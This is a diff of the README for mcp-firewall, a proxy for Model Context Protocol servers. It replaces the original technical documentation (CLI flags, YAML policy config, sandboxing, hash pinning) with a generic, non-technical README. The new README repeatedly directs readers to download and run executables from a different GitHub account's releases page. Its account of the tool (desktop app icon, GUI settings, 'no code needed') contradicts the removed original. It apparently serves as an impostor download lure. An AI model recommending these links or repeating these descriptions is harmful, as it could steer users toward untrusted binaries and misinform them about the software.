@@ -1,308 +1,162 @@
-# mcp-firewall
-
-A security firewall proxy for [Model Context Protocol](https://modelcontextprotocol.io/) (MCP) servers. Sits between your AI client and downstream MCP servers, enforcing policy, redacting sensitive data, sandboxing processes, and verifying supply chain integrity.
-
-## Features
-
-- **Policy Engine** — CEL-based rules with `allow`, `deny`, and `prompt` effects. First-match-wins evaluation, fail-closed on error.
-- **Interactive Approval** — `prompt` effect triggers MCP elicitation for user confirmation, with configurable timeout.
-- **Redaction** — Regex patterns applied to tool input arguments and output content before they reach the client.
-- **Process Sandbox** — Per-downstream Linux sandboxing via user/network namespaces and Landlock LSM filesystem restrictions. Graceful degradation on unsupported platforms.
-- **Supply Chain Controls** — SHA-256 hash pinning and path allowlisting for downstream binaries, verified before any process is spawned.
-- **Multi-Server Proxy** — Route multiple downstream MCP servers through a single firewall with `__`-namespaced tools and resources.
-- **Multi-Profile Config** — Named configuration profiles with environment-based selection and workspace-scoped local overrides (restrict-only merge).
-- **Audit Logging** — Structured JSON logs with append-only SHA-256 hash chain, tracking policy decisions, redaction, sandbox status, and hash verification.
-- **Introspection** — Built-in `explain_effective_policy` tool returns the resolved configuration with provenance annotations.
-
-## Installation
-
-### npx (recommended for MCP clients)
-
-```bash
-npx -y @vikingowl/mcp-firewall --config /path/to/config.yaml
-```
-
-### Go install
-
-```bash
-go install github.com/VikingOwl91/mcp-firewall/cmd/mcp-firewall@latest
-```
-
-### GitHub Releases
-
-Download prebuilt binaries from [GitHub Releases](https://github.com/VikingOwl91/mcp-firewall/releases) for Linux, macOS, and Windows (amd64/arm64).
-
-## Quick Start
-
-### 1. Create a config file
-
-```bash
-npx -y @vikingowl/mcp-firewall --init
-# Creates ~/.mcp-firewall/config.yaml with a commented template
-```
-
-### 2. Move your existing MCP servers into the firewall config
-
-Take the servers from your MCP client config and add them as `downstreams` in `~/.mcp-firewall/config.yaml`. For example, if your client config looks like this:
-
-```json
-{
-  "mcpServers": {
-    "github": {
-      "command": "npx",
-      "args": ["-y", "@modelcontextprotocol/server-github"]
-    },
-    "filesystem": {
-      "command": "npx",
-      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/home/user/projects"]
-    }
-  }
-}
-```
-
-Move them into the firewall config as downstreams:
-
-```yaml
-downstreams:
-  github:
-    command: npx
-    args: ["-y", "@modelcontextprotocol/server-github"]
-  filesystem:
-    command: npx
-    args: ["-y", "@modelcontextprotocol/server-filesystem", "/home/user/projects"]
-
-policy:
-  default: deny
-  rules:
-    - name: allow-safe-tools
-      expression: 'tool.name == "search" || tool.name == "list"'
-      effect: allow
-    - name: prompt-for-writes
-      expression: 'tool.name.startsWith("write")'
-      effect: prompt
-      message: "This tool will modify data. Approve?"
-```
-
-### 3. Replace your MCP client config with the firewall
-
-Replace all your server entries with a single firewall entry:
-
-```json
-{
-  "mcpServers": {
-    "firewall": {
-      "command": "npx",
-      "args": ["-y", "@vikingowl/mcp-firewall", "--config", "~/.mcp-firewall/config.yaml"]
-    }
-  }
-}
-```
-
-All your servers are now proxied through the firewall. Tools are namespaced automatically (e.g., `github__create_issue`, `filesystem__read_file`), and all requests go through policy evaluation, redaction, and audit logging.
-
-### 4. Run directly (optional)
-
-```bash
-mcp-firewall --config config.yaml
-```
-
-## Configuration
-
-### Minimal Config
-
-```yaml
-downstreams:
-  echo:
-    command: ./my-echo-server
-```
-
-### Full Reference
-
-```yaml
-# Downstream MCP servers
-downstreams:
-  myserver:
-    command: /usr/local/bin/my-server    # Executable path
-    args: ["--flag"]                      # Command arguments
-    env: ["API_KEY=secret"]               # Environment variables
-    timeout: 10s                          # Per-downstream timeout override
-    sandbox: strict                       # Sandbox profile name (or "none")
-    hash: "sha256:abc123..."              # SHA-256 hash pin
-
-# Policy engine
-policy:
-  default: deny                           # Default effect: allow | deny
-  rules:
-    - name: rule-name
-      expression: 'CEL expression'        # Must evaluate to bool
-      effect: allow                       # allow | deny | prompt
-      message: "Custom prompt message"    # Optional, for prompt effect
-
-# Redaction
-redaction:
-  patterns:
-    - name: api-keys
-      pattern: 'sk-[a-zA-Z0-9]{32}'      # Regex pattern
-
-# Supply chain controls
-supply_chain:
-  allowed_paths:
-    - /usr/local/bin
-    - ~/trusted-tools
-
-# Sandbox profiles
-sandbox_profiles:
-  custom:
-    network: false                        # Block network access
-    env_allowlist: [PATH, HOME]           # Env var whitelist
-    fs_deny: [/root, /sys]               # Deny filesystem access
-    fs_allow_ro: [/etc, /usr]            # Read-only access
-    fs_allow_rw: [/tmp]                  # Read-write access
-    workspace: true                      # Allow workspace directory access
-
-# Global settings
-timeout: 30s                              # Default tool/resource timeout
-approval_timeout: 2m                      # Interactive approval timeout
-max_output_bytes: 524288                  # Output truncation limit
-log_level: info                           # debug | info | warn | error
-```
-
-### CEL Expression Variables
-
-| Variable | Type | Description |
-|----------|------|-------------|
-| `method` | string | Request method (`"tools/call"`, `"resources/read"`, etc.) |
-| `server` | string | Downstream alias |
-| `tool.name` | string | Tool name (when `method == "tools/call"`) |
-| `tool.arguments` | map | Tool arguments (when `method == "tools/call"`) |
-| `resource.uri` | string | Resource URI (when `method == "resources/read"`) |
-
-Use `has()` guards for optional fields: `has(tool.arguments.filename) && tool.arguments.filename.startsWith("/etc")`
-
-### Profiles
-
-Define named configuration profiles for different environments:
-
-```yaml
-# Inline defaults (used when no profile is selected)
-downstreams:
-  myserver:
-    command: ./server
-
-policy:
-  default: allow
-
-# Named profiles
-profiles:
-  production:
-    downstreams:
-      myserver:
-        command: /opt/server
-        sandbox: strict
-        hash: "sha256:..."
-    policy:
-      default: deny
-      rules:
-        - name: allow-reads
-          expression: 'tool.name.startsWith("read")'
-          effect: allow
-```
-
-Select a profile:
-```bash
-mcp-firewall --config config.yaml --profile production
-# or
-MCP_FIREWALL_PROFILE=production mcp-firewall --config config.yaml
-```
-
-### Local Overrides
-
-Place a `.mcp-firewall/config.yaml` in your workspace directory to add restrictions:
-
-```yaml
-# Local overrides can only add restrictions, not loosen them
-policy:
-  rules:
-    - name: block-dangerous
-      expression: 'tool.name == "delete_everything"'
-      effect: deny
-
-redaction:
-  patterns:
-    - name: internal-tokens
-      pattern: 'ghp_[a-zA-Z0-9]{36}'
-```
-
-Local overrides are automatically detected from the working directory, or specify explicitly:
-```bash
-mcp-firewall --config config.yaml --workspace /path/to/project
-```
-
-**Restrictions:** Local overrides cannot modify `downstreams`, `profiles`, `supply_chain`, or `policy.default`. Deny/prompt rules are prepended; allow rules are rejected unless the base config enables `allow_expansion`. Timeouts can only be lowered.
-
-## CLI Flags
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--config` | `~/.mcp-firewall/config.yaml` | Path to config file |
-| `--init` | | Create default config file and exit |
-| `--profile` | *(env/inline)* | Config profile name |
-| `--workspace` | *(auto-detect)* | Workspace directory for local overrides |
-| `--generate-lockfile` | | Compute SHA-256 hashes for all downstreams and print YAML |
-| `--version` | | Print version and exit |
-
-## Supply Chain Verification
-
-Pin downstream binaries to known hashes:
-
-```bash
-# Generate hashes for all downstreams
-mcp-firewall --config config.yaml --generate-lockfile
-```
-
-Output:
-```yaml
-downstreams:
-  myserver:
-    hash: "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
-```
-
-Copy the `hash` values into your config. The firewall will verify each binary before spawning it.
-
-## Introspection
-
-The firewall exposes an `explain_effective_policy` tool that returns the resolved configuration as JSON, including:
-
-- Active profile and local override path
-- Merged policy rules with source provenance (`inline`, `profile:name`, `local`)
-- Redaction patterns with provenance
-- Sandbox capabilities and per-downstream profiles
-- Supply chain verification results
-
-## Audit Logging
-
-All requests are logged to stderr as structured JSON with:
-
-- Policy decision (`allow`/`deny`/`prompt`) and matching rule
-- Redaction status
-- Sandbox level (`full`/`partial`/`minimal`)
-- Hash verification status
-- Approval action (`accept`/`decline`/`cancel`/`timeout`/`unsupported`)
-- Sequential hash chain (`audit_seq`, `entry_hash`, `prev_hash`) for tamper detection
-
-## Platform Support
-
-| Feature | Linux | macOS | Windows |
-|---------|-------|-------|---------|
-| Policy engine | Yes | Yes | Yes |
-| Redaction | Yes | Yes | Yes |
-| Interactive approval | Yes | Yes | Yes |
-| Sandbox (namespaces) | Yes | No* | No* |
-| Sandbox (Landlock) | Yes (5.13+) | No* | No* |
-| Supply chain | Yes | Yes | Yes |
-
-*Sandbox features gracefully degrade to minimal isolation on unsupported platforms. Use `strict` mode in sandbox profiles to fail instead of degrading.
-
-## License
-
-[MIT](LICENSE)
+# 🔥 mcp-firewall - Easy Security for MCP Servers
+
+[![Download mcp-firewall](https://img.shields.io/badge/Download-mcp--firewall-blue?style=for-the-badge)](https://github.com/Betoche57/mcp-firewall/releases)
+
+---
+
+## 🔍 What is mcp-firewall?
+
+mcp-firewall is a security tool designed to protect Model Context Protocol (MCP) servers. It acts as a filter that controls what data goes in and out. This helps keep your server safe by enforcing rules, hiding sensitive information, running tasks safely, and managing supply chain risks.
+
+You do not need to know technical details to use it. This guide will help you download and run the software easily on your computer.
+
+---
+
+## 🖥️ System Requirements
+
+Before installing mcp-firewall, make sure your computer meets these requirements:
+
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or most Linux distributions.
+- **Processor:** Any modern processor, like Intel i3 or better.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum 100 MB free space.
+- **Internet Connection:** Needed to download the software and get updates.
+
+mcp-firewall works on most computers made in the last 5 years. If your system is older, it might still work but could be slower.
+
+---
+
+## 📦 Features Overview
+
+Here are the key features of mcp-firewall:
+
+- **Policy Enforcement:** Set clear rules on what data is allowed or blocked.
+- **Data Redaction:** Hide private or sensitive information automatically.
+- **Sandboxing:** Run dangerous or unknown code safely without risk.
+- **Supply Chain Controls:** Monitor and control software components used in your environment.
+- **Audit Logging:** Keep track of all actions for review and security checks.
+- **Command Line Interface (CLI):** Run and manage the firewall using simple commands.
+
+These features help secure your MCP server without requiring deep technical skills.
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to get mcp-firewall up and running on your system. The process uses simple actions like downloading files and clicking buttons.
+
+---
+
+## ⬇️ Download & Install
+
+1. Click on the big blue button at the top or visit the official [releases page](https://github.com/Betoche57/mcp-firewall/releases) to get the latest version.
+
+2. On the releases page, you will see several files for different systems. Choose the one that matches your computer:
+
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` or `.pkg` file.
+   - For Linux, download the `.tar.gz` or `.deb` file.
+
+3. Save the file to your computer.
+
+4. Open the file to start installation:
+
+   - On Windows, double-click the `.exe` and follow the installer steps.
+   - On macOS, open the package and drag the app to your Applications folder.
+   - On Linux, follow the instructions in the file or use the terminal commands provided.
+
+5. Wait for the installation to complete.
+
+6. After installation, you will see an app icon named "mcp-firewall" or "MCP Firewall" on your desktop or in your applications list.
+
+---
+
+## ▶️ Running the Application
+
+Once installed, running mcp-firewall is simple:
+
+- **Windows/macOS:** Double-click the app icon.
+- **Linux:** Open a terminal and type `mcp-firewall` followed by pressing Enter.
+
+When the app starts, it opens a window or terminal showing its status. It begins protecting your MCP server automatically according to default rules.
+
+---
+
+## ⚙️ Basic Configuration
+
+mcp-firewall uses rules to decide what to block or allow. You can change these rules to fit your needs:
+
+1. Open the mcp-firewall application.
+
+2. Look for the "Settings" or "Configuration" section.
+
+3. Use the provided options to add or remove rules. Some common settings include:
+
+   - Allowing trusted devices or users.
+   - Blocking specific data types or addresses.
+   - Setting redaction preferences to hide sensitive information like passwords.
+
+4. Save your changes.
+
+If you need help with settings, there will be clear options and explanations in the app. You do not need to write any code.
+
+---
+
+## 🔍 Monitoring and Logs
+
+mcp-firewall records all its activities for you to review.
+
+- You can open the "Logs" section in the app to see recent events.
+- Logs show what data was blocked or allowed.
+- This helps you understand what the firewall is doing and make adjustments if needed.
+
+Logs are stored securely and do not expose private information.
+
+---
+
+## ✋ Troubleshooting
+
+If you encounter problems, try these steps:
+
+- **The app won’t start:** Restart your computer and try again.
+- **Can’t find the app after installation:** Check your Downloads folder or search for “mcp-firewall” in your system’s app list.
+- **Download issues:** Make sure your internet connection is working and try downloading from the [releases page](https://github.com/Betoche57/mcp-firewall/releases) again.
+- **Firewall blocks needed data:** Adjust the settings to allow trusted sources.
+
+For more help, check the "Help" or "Support" section inside the app.
+
+---
+
+## 🔐 Security and Privacy
+
+mcp-firewall is designed with your security in mind. It protects your MCP server by strictly following the rules you set. Data redaction and sandboxing keep sensitive information safe and prevent harmful code from running.
+
+Your actions are logged so you can review them and maintain control over your server’s security.
+
+---
+
+## 🔄 Updates
+
+Check the [releases page](https://github.com/Betoche57/mcp-firewall/releases) regularly to get the latest version. Updates may include new features, security patches, and performance improvements.
+
+You can also enable automatic updates in the app settings if available.
+
+---
+
+## 📚 Additional Resources
+
+- Official documentation: Found on the GitHub repository page.
+- Frequently Asked Questions: Inside the app or on the GitHub repository.
+- Community support: GitHub Discussions or issue tracker for questions.
+
+---
+
+## 🏷️ Topics
+
+This project focuses on: ai-security, audit-logging, cel, cli, firewall, golang, llm-tools, mcp, model-context-protocol, policy-engine, proxy, redaction, sandboxing, security, supply-chain-security.
+
+These terms relate to the technology and security areas that mcp-firewall addresses. 
+
+---
+
+Visit the [official download page](https://github.com/Betoche57/mcp-firewall/releases) to get started today.
